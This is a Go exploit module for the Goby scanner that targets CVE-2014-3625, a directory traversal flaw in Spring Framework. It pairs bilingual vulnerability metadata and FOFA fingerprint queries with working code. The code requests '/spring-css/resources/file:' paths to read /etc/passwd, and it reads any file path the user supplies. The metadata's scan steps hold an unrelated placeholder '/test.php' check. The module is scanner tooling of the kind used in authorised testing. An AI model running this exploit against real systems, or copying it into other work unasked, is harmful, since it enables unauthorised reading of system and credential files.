package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Pivotal Software Spring Framework Directory Traversal Vulnerability",
    "Description": "<p>Pivotal Spring Framework is an open source Java and Java EE application framework from the American Pivotal Software company. The framework helps developers build high-quality applications.</p><p>Pivotal Spring Framework has a directory traversal vulnerability that allows an attacker to obtain any file on the file system that is accessible to the Spring web application process. This may lead to the leakage of sensitive information, thus posing a threat to the security of the system.</p>",
    "Product": "Spring-Framework",
    "Homepage": "https://tanzu.vmware.com/",
    "DisclosureDate": "2014-11-21",
    "PostTime": "2023-12-21",
    "Author": "Gryffinbit@gmail.com",
    "FofaQuery": "body=\"<h1>Spring + Hibernate + SpringMVC/Struts basic project.</h1>\" || header=\"SpringBoot\" || banner=\"SpringBoot\" || (body=\"Whitelabel Error Page\" && body=\"There was an unexpected error\") || title=\"Spring Batch Admin\" || title=\"Spring Batch Lightmin\" || header=\"org.springframework.web.servlet.i18n.CookieLocaleResolver.locale=\" || banner=\"org.springframework.web.servlet.i18n.CookieLocaleResolver.locale=\" || header=\"realm=\\\"Spring Security Application\" || banner=\"realm=\\\"Spring Security Application\" || header=\"Apache-Coyote\" || banner=\"Apache-Coyote\" || body=\"href=\\\"tomcat.css\" || title=\"Apache Tomcat\" || (title=\"Error report\" && title!=\"JBoss\") || body=\"This is the default Tomcat home page\" || server=\"tomcat\" || body=\"<h3>Apache Tomcat\" || banner=\"Tomcat\" || header=\"Tomcat\" || title=\"spring framework\" || header=\"JSESSIONID\" || banner=\"JSESSIONID\"",
    "GobyQuery": "body=\"<h1>Spring + Hibernate + SpringMVC/Struts basic project.</h1>\" || header=\"SpringBoot\" || banner=\"SpringBoot\" || (body=\"Whitelabel Error Page\" && body=\"There was an unexpected error\") || title=\"Spring Batch Admin\" || title=\"Spring Batch Lightmin\" || header=\"org.springframework.web.servlet.i18n.CookieLocaleResolver.locale=\" || banner=\"org.springframework.web.servlet.i18n.CookieLocaleResolver.locale=\" || header=\"realm=\\\"Spring Security Application\" || banner=\"realm=\\\"Spring Security Application\" || header=\"Apache-Coyote\" || banner=\"Apache-Coyote\" || body=\"href=\\\"tomcat.css\" || title=\"Apache Tomcat\" || (title=\"Error report\" && title!=\"JBoss\") || body=\"This is the default Tomcat home page\" || server=\"tomcat\" || body=\"<h3>Apache Tomcat\" || banner=\"Tomcat\" || header=\"Tomcat\" || title=\"spring framework\" || header=\"JSESSIONID\" || banner=\"JSESSIONID\"",
    "Level": "1",
    "Impact": "<p>Pivotal Spring Framework has a directory traversal vulnerability that allows an attacker to obtain any file on the file system that is accessible to the Spring web application process. This may lead to the leakage of sensitive information, thus posing a threat to the security of the system.</p>",
    "Recommendation": "<p>Currently, the manufacturer has released an upgrade patch to fix this security issue. The link to obtain the patch is: <a href=\"http://www.pivotal.io/security/cve-2014-3625\">http://www.pivotal.io/security/cve-2014-3625</a></p>",
    "References": [
        "https://github.com/ilmila/springcss-cve-2014-3625"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "custom",
            "show": ""
        },
        {
            "name": "filePath",
            "type": "input",
            "value": "/../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "Directory Traversal"
    ],
    "VulType": [
        "Directory Traversal",
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2014-3625"
    ],
    "CNNVD": [
        "CNNVD-201411-372"
    ],
    "CNVD": [
        "CNVD-2014-08465"
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "Pivotal Software Spring Framework 目录遍历漏洞",
            "Product": "vmware-Spring-Framework",
            "Description": "<p>Pivotal Spring Framework 是美国 Pivotal Software 公司的一套开源的Java、Java EE 应用程序框架。该框架可帮助开发人员构建高质量的应用。&nbsp;</p><p>Pivotal Spring Framework 存在目录遍历漏洞，攻击者可以利用这个漏洞获取到任何在文件系统上对 Spring web 应用程序进程可访问的文件。这可能会导致敏感信息的泄露，从而对系统的安全性造成威胁。<br></p>",
            "Recommendation": "<p>目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接： <a href=\"http://www.pivotal.io/security/cve-2014-3625\">http://www.pivotal.io/security/cve-2014-3625</a><br><br></p>",
            "Impact": "<p>攻击者可以利用这个漏洞获取到任何在文件系统上对 Spring web 应用程序进程可访问的文件。这可能会导致敏感信息的泄露，从而对系统的安全性造成威胁。<br></p>",
            "VulType": [
                "文件读取",
                "目录遍历"
            ],
            "Tags": [
                "文件读取",
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "Pivotal Software Spring Framework Directory Traversal Vulnerability",
            "Product": "Spring-Framework",
            "Description": "<p>Pivotal Spring Framework is an open source Java and Java EE application framework from the American Pivotal Software company. The framework helps developers build high-quality applications.</p><p>Pivotal Spring Framework has a directory traversal vulnerability that allows an attacker to obtain any file on the file system that is accessible to the Spring web application process. This may lead to the leakage of sensitive information, thus posing a threat to the security of the system.</p>",
            "Recommendation": "<p>Currently, the manufacturer has released an upgrade patch to fix this security issue. The link to obtain the patch is: <a href=\"http://www.pivotal.io/security/cve-2014-3625\">http://www.pivotal.io/security/cve-2014-3625</a><br></p>",
            "Impact": "<p>Pivotal Spring Framework has a directory traversal vulnerability that allows an attacker to obtain any file on the file system that is accessible to the Spring web application process. This may lead to the leakage of sensitive information, thus posing a threat to the security of the system.<br></p>",
            "VulType": [
                "Directory Traversal",
                "File Read"
            ],
            "Tags": [
                "File Read",
                "Directory Traversal"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10899"
}`

	sendPayload7dYFgdGsnR3cd := func(hostInfo *httpclient.FixUrl, uri string) (*httpclient.HttpResponse, error) {
		payloadConfig := httpclient.NewGetRequestConfig("/spring-css/resources/file:" + uri)
		payloadConfig.VerifyTls = false
		payloadConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, payloadConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			var result bool
			for _, path := range []string{"/etc/passwd", "/../etc/passwd", "/../../etc/passwd"} {
				resp, _ := sendPayload7dYFgdGsnR3cd(hostInfo, path)
				if resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, ":x:") && strings.Contains(resp.Utf8Html, "/usr/") {
					result = true
					break
				}
			}
			return result
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			filePath := goutils.B2S(stepLogs.Params["filePath"])
			if attackType == "custom" {
				resp, err := sendPayload7dYFgdGsnR3cd(expResult.HostInfo, filePath)
				if resp != nil && resp.StatusCode == 200 && len(resp.Utf8Html) > 0 {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
				} else if resp == nil && err != nil {
					expResult.Output = err.Error()
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
